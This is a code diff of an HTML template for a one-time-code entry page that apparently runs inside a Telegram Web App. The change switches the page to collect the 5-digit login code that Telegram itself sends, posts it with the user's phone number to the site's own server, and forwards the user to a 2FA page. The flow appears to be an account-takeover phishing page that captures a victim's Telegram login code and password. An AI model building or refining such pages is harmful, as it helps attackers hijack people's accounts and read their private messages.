@@ -1,300 +1,104 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enter OTP</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Enter 5-digit OTP</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { width: 100%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; }
-        .header { background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; padding: 25px 20px; text-align: center; }
-        .header h2 { font-size: 24px; margin-bottom: 5px; font-weight: 600; }
-        .content { padding: 25px; }
-        .phone-display { background: #e8f5e9; padding: 15px; border-radius: 10px; text-align: center; margin-bottom: 20px; border-left: 4px solid #4CAF50; }
-        .phone-display h3 { color: #2E7D32; margin-bottom: 5px; }
-        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
-        .otp-digit { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 600; border: 2px solid #ddd; border-radius: 8px; background: #f9f9f9; }
-        .otp-digit:focus { border-color: #0088cc; outline: none; background: white; box-shadow: 0 0 0 3px rgba(0,136,204,0.1); }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 10px 0; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.3s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(76,175,80,0.3); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
-        .btn-resend { background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%); }
-        .alert { padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
-        .alert.error { background: #ffebee; color: #d32f2f; border-left: 4px solid #f44336; }
-        .alert.success { background: #e8f5e9; color: #2e7d32; border-left: 4px solid #4caf50; }
-        .alert.show { display: block; }
-        .timer { text-align: center; margin: 15px 0; color: #666; font-size: 14px; }
-        .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .instructions { background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 20px; font-size: 14px; color: #555; }
+        body { font-family: Arial; padding: 20px; background: #f0f2f5; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; }
+        h2 { color: #333; text-align: center; }
+        .phone-display { background: #e3f2fd; padding: 15px; border-radius: 8px; text-align: center; margin: 20px 0; }
+        input { width: 100%; padding: 15px; font-size: 20px; text-align: center; letter-spacing: 10px; }
+        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; border-radius: 8px; font-size: 16px; }
+        .note { color: #666; font-size: 14px; margin-top: 10px; text-align: center; }
+        .error { color: #f44336; padding: 10px; background: #ffebee; border-radius: 5px; margin: 10px 0; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h2>🔢 Enter OTP</h2>
-            <p>Step 2: Verify Your Phone</p>
+        <h2>🔢 Enter 5-digit OTP</h2>
+        
+        <div class="phone-display">
+            📱 Phone: {{ phone }}
         </div>
         
-        <div class="content">
-            <div class="phone-display">
-                <h3>📱 Verification Phone</h3>
-                <p style="font-size: 18px; font-weight: 600;">{{ phone }}</p>
-                <p style="font-size: 12px; color: #666; margin-top: 5px;">OTP sent to this number</p>
-            </div>
-            
-            <div class="alert error" id="error-alert"></div>
-            <div class="alert success" id="success-alert"></div>
-            
-            <div class="instructions">
-                <p>📨 Enter the 6-digit verification code sent to your phone.</p>
-                <p>⚠️ The code expires in 10 minutes.</p>
-            </div>
-            
-            <div class="otp-inputs" id="otp-container">
-                <input type="text" class="otp-digit" maxlength="1" data-index="0" oninput="moveToNext(this)">
-                <input type="text" class="otp-digit" maxlength="1" data-index="1" oninput="moveToNext(this)">
-                <input type="text" class="otp-digit" maxlength="1" data-index="2" oninput="moveToNext(this)">
-                <input type="text" class="otp-digit" maxlength="1" data-index="3" oninput="moveToNext(this)">
-                <input type="text" class="otp-digit" maxlength="1" data-index="4" oninput="moveToNext(this)">
-                <input type="text" class="otp-digit" maxlength="1" data-index="5" oninput="moveToNext(this)">
-            </div>
-            
-            <div class="timer" id="timer">
-                Resend OTP in: <span id="countdown">60</span> seconds
-            </div>
-            
-            <button id="verify-btn" class="btn" onclick="verifyOTP()" disabled>
-                ✅ Verify OTP
-            </button>
-            
-            <button id="resend-btn" class="btn btn-resend" onclick="resendOTP()" disabled>
-                🔄 Resend OTP
-            </button>
-            
-            <div style="text-align: center; margin-top: 20px;">
-                <a href="/verify?session_id={{ session_id }}" style="color: #0088cc; text-decoration: none;">
-                    ← Back to contact sharing
-                </a>
-            </div>
-        </div>
+        <p><b>Note:</b> Telegram sends <b>5-digit</b> OTP codes</p>
+        
+        <input type="text" id="otp" 
+               placeholder="12345" 
+               maxlength="5" 
+               pattern="\d{5}"
+               oninput="this.value = this.value.replace(/\D/g, '').slice(0,5)">
+        
+        <div class="note">Enter exactly 5 digits (no spaces)</div>
+        
+        <button onclick="verifyOTP()" style="margin-top: 20px;">
+            ✅ Verify OTP
+        </button>
+        
+        <div id="message" class="error" style="display: none;"></div>
     </div>
 
     <script>
         const sessionId = "{{ session_id }}";
-        let countdown = 60;
-        let countdownInterval;
-        
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log("🔧 OTP page loaded");
-            console.log("Session ID:", sessionId);
-            
-            // Initialize Telegram WebApp
-            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-                const tg = Telegram.WebApp;
-                tg.ready();
-                tg.expand();
-                tg.BackButton.show();
-                tg.BackButton.onClick(() => {
-                    window.location.href = `/verify?session_id=${sessionId}`;
-                });
-            }
-            
-            // Setup OTP input listeners
-            setupOTPInputs();
-            
-            // Start countdown timer
-            startCountdown();
-            
-            // Focus first OTP input
-            document.querySelector('.otp-digit').focus();
-        });
-        
-        function setupOTPInputs() {
-            const inputs = document.querySelectorAll('.otp-digit');
-            
-            inputs.forEach(input => {
-                input.addEventListener('input', function() {
-                    const value = this.value;
-                    const index = parseInt(this.dataset.index);
-                    
-                    // Allow only digits
-                    if (!/^\d$/.test(value)) {
-                        this.value = '';
-                        return;
-                    }
-                    
-                    // Auto-focus next input
-                    if (value && index < 5) {
-                        inputs[index + 1].focus();
-                    }
-                    
-                    // Check if all digits filled
-                    checkOTPComplete();
-                });
-                
-                input.addEventListener('keydown', function(e) {
-                    const index = parseInt(this.dataset.index);
-                    
-                    // Handle backspace
-                    if (e.key === 'Backspace' && !this.value && index > 0) {
-                        inputs[index - 1].focus();
-                        inputs[index - 1].value = '';
-                        checkOTPComplete();
-                    }
-                });
-            });
-        }
-        
-        function moveToNext(input) {
-            const nextIndex = parseInt(input.dataset.index) + 1;
-            if (input.value && nextIndex < 6) {
-                document.querySelector(`.otp-digit[data-index="${nextIndex}"]`).focus();
-            }
-            checkOTPComplete();
-        }
-        
-        function checkOTPComplete() {
-            const inputs = document.querySelectorAll('.otp-digit');
-            const otp = Array.from(inputs).map(input => input.value).join('');
-            const verifyBtn = document.getElementById('verify-btn');
-            
-            verifyBtn.disabled = otp.length !== 6;
-        }
-        
-        function getOTP() {
-            const inputs = document.querySelectorAll('.otp-digit');
-            return Array.from(inputs).map(input => input.value).join('');
-        }
+        const phone = "{{ phone }}";
         
         function verifyOTP() {
-            const otp = getOTP();
+            const otpInput = document.getElementById('otp');
+            const otp = otpInput.value;
             
-            if (otp.length !== 6) {
-                showError("Please enter 6-digit OTP");
+            // Validate 5 digits
+            if (otp.length !== 5 || !/^\d{5}$/.test(otp)) {
+                showMessage('Please enter exactly 5 digits (e.g., 12345)');
                 return;
             }
             
-            const btn = document.getElementById('verify-btn');
+            // Show loading
+            const btn = document.querySelector('button');
+            btn.innerHTML = '⏳ Verifying...';
             btn.disabled = true;
-            btn.innerHTML = '<div class="spinner"></div> Verifying...';
             
+            // Send to server
             fetch('/api/verify-otp', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     session_id: sessionId,
+                    phone: phone,
                     otp: otp
                 })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
-                    showSuccess("✅ Verification successful!");
-                    
-                    // Redirect to success page
-                    setTimeout(() => {
+                    if (data.requires_2fa) {
+                        // Redirect to 2FA page
                         window.location.href = data.redirect;
-                    }, 1500);
-                } else {
-                    showError(data.error || "Invalid OTP");
-                    btn.disabled = false;
-                    btn.innerHTML = '✅ Verify OTP';
-                    
-                    // Clear OTP inputs on error
-                    if (data.error.includes('Invalid')) {
-                        clearOTPInputs();
+                    } else {
+                        // Success, go to success page
+                        window.location.href = data.redirect;
                     }
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                showError("Network error. Please try again.");
-                btn.disabled = false;
-                btn.innerHTML = '✅ Verify OTP';
-            });
-        }
-        
-        function resendOTP() {
-            const btn = document.getElementById('resend-btn');
-            btn.disabled = true;
-            btn.innerHTML = '<div class="spinner"></div> Sending...';
-            
-            fetch('/api/resend-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    session_id: sessionId
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    showSuccess("✅ New OTP sent!");
-                    clearOTPInputs();
-                    resetCountdown();
                 } else {
-                    showError(data.error || "Failed to resend OTP");
+                    showMessage('Error: ' + data.error);
+                    btn.innerHTML = '✅ Verify OTP';
+                    btn.disabled = false;
                 }
-                
-                btn.disabled = false;
-                btn.innerHTML = '🔄 Resend OTP';
             })
             .catch(error => {
-                console.error("Error:", error);
-                showError("Network error");
+                showMessage('Network error. Please try again.');
+                btn.innerHTML = '✅ Verify OTP';
                 btn.disabled = false;
-                btn.innerHTML = '🔄 Resend OTP';
             });
         }
         
-        function startCountdown() {
-            const timerElement = document.getElementById('countdown');
-            const resendBtn = document.getElementById('resend-btn');
-            
-            countdownInterval = setInterval(() => {
-                countdown--;
-                timerElement.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    document.getElementById('timer').style.display = 'none';
-                    resendBtn.disabled = false;
-                }
-            }, 1000);
+        function showMessage(text) {
+            const msgDiv = document.getElementById('message');
+            msgDiv.textContent = text;
+            msgDiv.style.display = 'block';
         }
         
-        function resetCountdown() {
-            clearInterval(countdownInterval);
-            countdown = 60;
-            document.getElementById('countdown').textContent = countdown;
-            document.getElementById('timer').style.display = 'block';
-            document.getElementById('resend-btn').disabled = true;
-            startCountdown();
-        }
-        
-        function clearOTPInputs() {
-            const inputs = document.querySelectorAll('.otp-digit');
-            inputs.forEach(input => input.value = '');
-            inputs[0].focus();
-            checkOTPComplete();
-        }
-        
-        function showError(message) {
-            const alert = document.getElementById('error-alert');
-            alert.textContent = message;
-            alert.classList.add('show');
-            setTimeout(() => alert.classList.remove('show'), 5000);
-        }
-        
-        function showSuccess(message) {
-            const alert = document.getElementById('success-alert');
-            alert.textContent = message;
-            alert.classList.add('show');
-            setTimeout(() => alert.classList.remove('show'), 3000);
-        }
+        // Auto-focus input
+        document.getElementById('otp').focus();
     </script>
 </body>
 </html>
